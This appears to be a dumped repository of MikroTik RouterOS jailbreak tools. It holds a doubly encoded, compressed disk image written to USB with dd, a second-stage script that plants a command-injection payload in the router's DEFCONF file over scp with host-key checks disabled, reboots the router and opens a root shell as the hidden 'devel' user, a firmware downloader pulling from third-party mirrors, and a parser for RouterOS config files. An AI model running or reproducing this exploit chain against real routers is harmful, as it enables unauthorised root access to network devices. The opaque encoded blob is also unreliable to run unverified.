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
RcGPr7PZL8avkVnvybHSAAA=
" | base64 -d | zcat | base64 -d | zcat | dd bs=1M of=$1

sync
partprobe

echo "Done. Now plug the device into a MikroTik RouterOS router and run the second stage."
echo


File: /exploit-defconf\second_stage.sh
#!/bin/bash
# (C) Kirils Solovjovs, 2018

if [ "$(ps -o comm= $PPID)" == "ssh" ]; then
	cat /tmp/.pass
	exit 0
fi


function cleanup {
  rm /tmp/.pass 2> /dev/null
  rm -- /tmp/jb_c_* 2> /dev/null
}

trap cleanup EXIT


vercomp () {
    #(C) Dennis Williamson, 2010, https://stackoverflow.com/questions/4023830/how-to-compare-two-strings-in-dot-separated-version-format-in-bash
    if [[ $1 == $2 ]]
    then
        return 0
    fi
    local IFS=.
    local i ver1=($1) ver2=($2)
    # fill empty fields in ver1 with zeros
    for ((i=${#ver1[@]}; i<${#ver2[@]}; i++))
    do
        ver1[i]=0
    done
    for ((i=0; i<${#ver1[@]}; i++))
    do
        if [[ -z ${ver2[i]} ]]
        then
            # fill empty fields in ver2 with zeros
            ver2[i]=0
        fi
        if ((10#${ver1[i]} > 10#${ver2[i]}))
        then
            return 1
        fi
        if ((10#${ver1[i]} < 10#${ver2[i]}))
        then
            return 2
        fi
    done
    return 0
}


cd "$(dirname "$(echo $0)")"

rm /tmp/PASSOUT 2> /dev/null
echo "* Not affiliated with Mikrotikls or Oracle *"
echo
echo "Welcome to jailbreak tool v2.00 for MikroTik devices"
echo "                                    by PossibleSecurity.com"
echo 
echo "WARNING! THIS TOOL MAY BRICK YOUR DEVICE. USE AT YOUR OWN RISK."
echo "AUTHORS OF THIS TOOL MAY NOT BE HOLD LIABLE FOR ANY DIRECT OR"
echo "INDIRECT DAMAGES CAUSED AS A RESULT OF USING THIS TOOL."
echo 
echo "Plug in the magic USB into the router now!"
echo "If <<brick>> happens, go for netinstall to recover."
echo 
echo " * * * * * * * * "

JBID="jb_c_$$_$RANDOM"

echo "We'll need the IP address of the device, user and password."
while true; do
	echo -n "IP [192.168.88.1]: "
	read IP
	echo "USER [admin]: admin"
	USER="admin"
	echo -n "PASS []: "
	read PASS
	[ "$IP" == "" ] && IP="192.168.88.1"
	echo 
	echo "We got $USER@$IP with password '$PASS'."
	while true; do
		echo -n "Is this correct? (y/N) "
		read confirm
		[ -z "$confirm" ] && echo "Please enter 'yes' or 'no'!" || break
	done

	[ "${confirm:0:1}" == "y" -o "${confirm:0:1}" == "Y" ] && break
	echo "Try again, please."
done


echo -n "$PASS" > /tmp/.pass

echo 
echo "Let's begin."

ping -c1 $IP &> /dev/null
[ $? -ne 0 ] && echo ERROR: IP address must respond to ICMP echo requests. && exit 1



echo "Verifying version..."
res="$(DISPLAY="none" SSH_ASKPASS="$0" setsid ssh -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -l "$USER" "$IP" "/system resource print" 2>/dev/null )"
[ "$?" -ne "0" ] && echo ERROR: Unable to connect to $IP:22 with user $USER. && exit 1

arch="$(echo $res |tr $'\r' $'\n'| grep architecture-name |cut -d : -f 2|tr -dc [a-zA-Z0-9]_ )"
version="$(echo $res |tr $'\r' $'\n'| grep version |cut -d : -f 2|cut -d \( -f 1|tr -dc [a-zA-Z0-9]._ )"

version_cmp="$(echo $version | sed s/rc.*$//)"
version_rc="$(echo $version |grep rc | sed s/^.*rc//)"

vercomp "$version_cmp" "6.41"
[ $? -eq 2 ] && echo "Software $version is not supported by this tool. The first supported version is 6.41rc1. Use exploit_backup for older versions." && exit 9


echo "; mkdir /pckg/option; mount -o bind /boot/ /pckg/option; ln -s / /rw/pckg/.root;" > /tmp/$JBID

echo -n "Trying to enable jailbreak..."

success="0"
for ((i=0;i<=5;i++)); do
	echo -n "$i..."
	[ $i -eq 0 ] && disk="/" || disk="/disk$i/"
	DISPLAY="none" SSH_ASKPASS="$0" setsid scp -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "/tmp/$JBID" "$USER@$IP:$disk.root/rw/DEFCONF"  2> /dev/null
	[ "$?" -eq "0" ] && success="1" && echo "success" && break
done

[ "$success" -eq "0" ] && echo ERROR: Unable to upload jailbreak to $IP:22 with user $USER. Are you sure that 'magic' USB is connected? && exit 1

res="$(DISPLAY="none" SSH_ASKPASS="$0" setsid ssh -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -l "$USER" "$IP" "/system reboot" 2> /dev/null)"

st=$?

[ "$st" -ne "0" -a "$st" -ne "255" ] && echo ERROR: Unable to order reboot. Please reboot manually and ssh with user devel. && exit 1
# st == 255 on too fast disconnect too

echo "Waiting for device to reboot..."
sleep 10

echo "Waiting for device to become available..."
until ping -c1 $IP &>/dev/null; do :; done

echo "Loading your one time shell... Enjoy!"
SSH_ASKPASS="$0" setsid ssh -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -l "devel" "$IP"




File: /getnpk.sh
#!/bin/bash

# (C) Kirils Solovjovs
# Beware! Script uses third party sources. You may get wrong stuff... or even worse.

[ -z "$1" ] && echo "Usage $0 <version>, e.g. $0 6.26" && exit 1
for x in $*; do
   ext="$(echo $x | rev | cut -d \. -f 1 |rev)"
	[ -z "$(echo $ext | grep -E "^[a-z]+$")" ] && ext="npk" || x="$(echo $x | rev | cut -d \. -f 2- |rev)"
	xp="${x//[^-]}"
	xp="${#xp}"
	[ "$xp" -eq "0" ] && name="routeros-x86-$x"
	[ "$xp" -eq "1" ] && name="routeros-$x"
	[ "$xp" -ge "2" ] && name="$x"

	name="$(echo $name | sed 's/^-//i')"

	x="$(echo $name| rev|cut -d \- -f 1|rev )"
	name="$name.$ext"

	[ -f "$name" ] && echo exists: $name && continue
	wget -q https://download2.mikrotik.com/routeros/$x/$name
	[ "$?" -eq "0" ] && echo done: $name && continue
	wget -q	http://upgrade.mikrotik.com/routeros/$x/$name
	[ "$?" -eq "0" ] && echo done: $name && continue
	wget -q http://admin.roset.cz/Mikrotik/routeros-ALL-$x/$name
	[ "$?" -eq "0" ] && echo done: $name && continue
	wget -q "http://mirror2.polsri.ac.id/MikroTik/RouterOS/RouterOS%20$x/$name"
	[ "$?" -eq "0" ] && echo done: $name && continue
	wget -q http://mirror.poliwangi.ac.id/mikrotik/$x/$name
	[ "$?" -eq "0" ] && echo done: $name && continue
	wget -q http://www.hlucin.net/mikrotik/$x/$name
	[ "$?" -eq "0" ] && echo done: $name && continue
	wget -q http://204.62.56.64/mikrotik/$x/$name
	[ "$?" -ne "0" ] && echo failed: $name || echo done: $name
done


File: /mt_dat_decoder.py
# (C) Kirils Solovjovs, 2017

from warnings import warn
from struct import unpack
from collections import OrderedDict

class MTConfig(object):
	
	def __init__(self, datFileName, idxFileName=None):
		self.__db = open(datFileName, 'rb')
		if idxFileName is None:
			self.__index = None
		else:
			self.__index = open(idxFileName, 'rb')
		self.__ip = 0
		self.mapping = {0xfe0009 : 'comment',
						0xfe0001: 'record_id',
						0xfe000a: 'disabled',
						0xfe000d: 'default',
						0xffffff: 'index_id',
						0xfe0008: 'active',
						0xfe0010: 'name',
						}
		self.decode = False
		self.returnTypes = False
		self.preserveOrder = False
		self.parsers = {}
		self.filters = {}
		self.__idFormat = "_%c%x"
		self.__idFormatTypeLocation = 1
	
	@property
	def idFormat(self):
		return self.__idFormat
		
	@idFormat.setter
	def idFormat(self, idFormat):
		
		for i in map(chr, range(33, 48)):
			if i not in idFormat:
				break
		if i == "0":
			raise Exception("Unable to detect type position inside id format. Try using less characters.")
		
		self.__idFormat = idFormat
		
		test = idFormat %(i,0xAABBCC)
		if i in test:
			self.__idFormatTypeLocation = test.index(i)
		else:
			self.__idFormatTypeLocation = None

			
	def __iter__(self):
		return self


	def next(self):
		
		if self.__index is None:
			try:
				size, = unpack("<H",self.__db.read(2))
				parsed = self.parse_record(self.__db.read(size-2))
				if parsed is not None and self.returnTypes:
					parsed[iid_r] = (0x08,parsed[iid_r])
				return parsed
			except:
				raise StopIteration
			
		iid = 0xFFFFFFFF
		while iid == 0xFFFFFFFF:
			ientry=self.__index.read(12)
			if len(ientry)<12:
				raise StopIteration
			iid, = unpack("<I",ientry[0:4])
			ilen, = unpack("<I",ientry[4:8])
			isep, = unpack("<I",ientry[8:12])
			self.__ip += ilen
		
		if isep != 5:
			warn("Non-standart index separator %08X." % isep)
		
		self.__db.seek(self.__ip - ilen)
		size, = unpack("<H",self.__db.read(2))
		parsed = self.parse_record(self.__db.read(size-2))
		
		if parsed is None:
			return None
		
		iid_r = self.__idFormat % ("$",0xffffff)
		if self.decode:
			if (0xffffff) in self.mapping:
				iid_r = self.mapping[0xffffff]
			elif iid_r in self.mapping:
				iid_r = self.mapping[iid_r]
				
		parsed[iid_r] = self.parse_value(0xffffff,iid_r,0x08,iid)

		if self.returnTypes:
			parsed[iid_r] = (0x08,parsed[iid_r])
			
		return parsed
		
	def __mangle_data(self,what,which,how):
		if which in how:
			if isinstance(what,list):
				what_r=[ how[which](x) for x in what ] 
				go = sum([ x is not None for x in what_r ])
				if go == len(what):
					return what_r
				
			else:
				what_r=how[which](what)
				if what_r is not None:
					return what_r
					
		return None
		
	def parse_value(self,blockid_raw,blockid,blocktype,data):
		data_r = self.__mangle_data(data,blockid,self.parsers)
		if data_r is not None:
			return data_r
		data_r = self.__mangle_data(data,blockid_raw,self.parsers)
		if data_r is not None:
			return data_r
		data_r = self.__mangle_data(data,blocktype,self.filters)
		if data_r is not None:
			return data_r
		if self.__idFormatTypeLocation is not None:
			data_r = self.__mangle_data(data,blockid[self.__idFormatTypeLocation],self.filters)
			if data_r is not None:
				return data_r		
		data_r = self.__mangle_data(data,type(data),self.filters)
		if data_r is not None:
			return data_r
		return data
					
	
	def parse_record(self, record, topID=0):
		if self.preserveOrder:
			alldata = OrderedDict()
		else:
			alldata = {}

		if record[0:2] != "\x4D\x32":
			warn("Not MT DAT record.")
			return None
		
		bpointer = 2
		while bpointer+4 < len(record):
			bmarker, = unpack("<I",record[bpointer:bpointer+4])
			bpointer += 4
			bidraw = bmarker & 0xffffff
					
			btype = bmarker >> 24
			
			blen = None
			data = None
			

			'''
			btype ........
			      0000000, - boolean 
			      ,,1,1,,, - M2 block (len = short)
			      ,,11,,,, - binary data block (len = short)
			      ,,,,,,,1 - one byte
			      ,,,,,,1, - ???
			      ,,,,,1,, - ???
			      ,,,11,,, - 128bit int
			      ,,,,1,,, - int (four bytes)
			      ,,,1,,,, - long (8 bytes)
			      ,,1,,,,, - string
			      ,1,,,,,, - ??? unused? or long array of?
			      1,,,,,,, - short array of
			      			      
			types (MT notation)
				(CAPITAL X = list of x)

				a,A, (0x18) IPv6 address (or duid)
				b,B, bool
				  M, multi
				q,Q, (0x10) big number
				r,R, (0x31) mac address
				s,S, (0x21) string
				u,U, unsigned integer

			'''
			if btype == 0x21: #freelength short string	
				blen, = unpack("B",record[bpointer])
				bpointer += 1
				data = record[bpointer:bpointer+blen]
				mtype = "s"
			elif btype == 0x31: #freelength list of bytes (mac address)
				blen, = unpack("B",record[bpointer])
				bpointer += 1
				mtype = "r"
				data = map(ord,record[bpointer:bpointer+blen])
			elif btype == 0x08: #int
				blen = 4
				data, = unpack("<I",record[bpointer:bpointer+blen])
				mtype = "u"
			elif btype == 0x10: #long
				blen = 8
				data, = unpack("<Q",record[bpointer:bpointer+blen])
				mtype = "q"
				data = long(data)
			elif btype == 0x18: #128bit integer
				blen = 16
				data = map(ord,record[bpointer:bpointer+blen])
				mtype = "a"
			elif btype == 0x09: # byte
				blen = 1
				data, = unpack("B",record[bpointer:bpointer+blen])
				mtype = "u"
			elif btype == 0x29: # single short M2 block
				blen = 1
				sub_size, = unpack("B",record[bpointer:bpointer+blen])
				data = self.parse_record(record[bpointer+1:bpointer+1+sub_size],topID=(topID<<24)+bidraw)
				bpointer += sub_size
				mtype = "M"
			elif btype == 0xA8: # array of M2 blocks
				blen = 2
				arraysize, = unpack("<H",record[bpointer:bpointer+blen])
				parser = 0
				data = []
				while parser < arraysize:
					parser += 1
					bpointer += blen
					sub_size, = unpack("<H",record[bpointer:bpointer+2])
					bpointer += 2
					data.append(self.parse_record(record[bpointer:bpointer+sub_size],topID=(topID<<24)+bidraw))
					# MT has a bug here ^^, replicate it 
					
					bpointer += sub_size - 2
				mtype = "M"
			elif btype == 0x88: #array of int
				blen = 2
				arraysize, = unpack("<H",record[bpointer:bpointer+blen])
				parser = 0
				data = []
				while parser < arraysize:
					parser += 1
					data.append(unpack("<I",record[bpointer+blen:bpointer+blen+4])[0])
					bpointer += 4
				mtype = "U"
			elif btype == 0xA0: #array of strings
				blen = 2
				arraysize, = unpack("<H",record[bpointer:bpointer+blen])
				parser = 0
				data = []
				while parser < arraysize:
					parser += 1
					bpointer += blen
					sub_size, = unpack("<H",record[bpointer:bpointer+2])
					bpointer += 2
					data.append(record[bpointer:bpointer+sub_size])
					bpointer += sub_size - 2
				mtype = "S"
				
			elif btype == 0x00 or btype == 0x01:  # boolean
				blen = 0
				data = False if not btype else True
				mtype = "b"
			else:
				warn("Unknown datatype %02X." % btype)
				mtype = " "
				blen = 0
				data = None
			
			bid = self.__idFormat % (mtype,bidraw)
			if self.decode:
				if ((topID<<24) + bidraw) in self.mapping:
					bid = self.mapping[((topID<<24) + bidraw)]
				elif bid in self.mapping:
					bid = self.mapping[bid]


			data = self.parse_value	((topID<<24) + bidraw,bid,btype,data)
			
			
			if bid in alldata:
